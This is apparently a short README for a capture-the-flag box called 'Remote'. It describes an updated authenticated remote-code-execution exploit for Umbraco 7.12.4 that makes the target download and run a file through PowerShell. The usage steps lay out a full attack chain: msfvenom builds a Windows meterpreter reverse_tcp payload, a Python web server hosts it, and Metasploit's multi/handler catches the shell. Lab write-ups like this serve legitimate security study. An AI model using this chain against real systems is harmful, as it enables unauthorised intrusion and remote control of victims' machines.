# Remote

## Umbraco 7.12.4 Authenticated RCE (updated payload)

Original exploit: https://www.exploit-db.com/exploits/46153

Since the original exploit is a PoC it just pops up a calculator,I updated the script to download and execute a file with powershell. Build your own payload and use it with this script.

### Usage:

Create a payload: `sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4444 -f exe -o payload.exe`

Host the payload: `sudo python -m SimpleHTTPServer 80`

Change IP Address to python web server's IP Address (line 25)

Change username,password & host (line 33,34,35)

Setup a listener with metasploit's `multi/handler`

Run the script: `python3 umbraco_auth_rce.py`
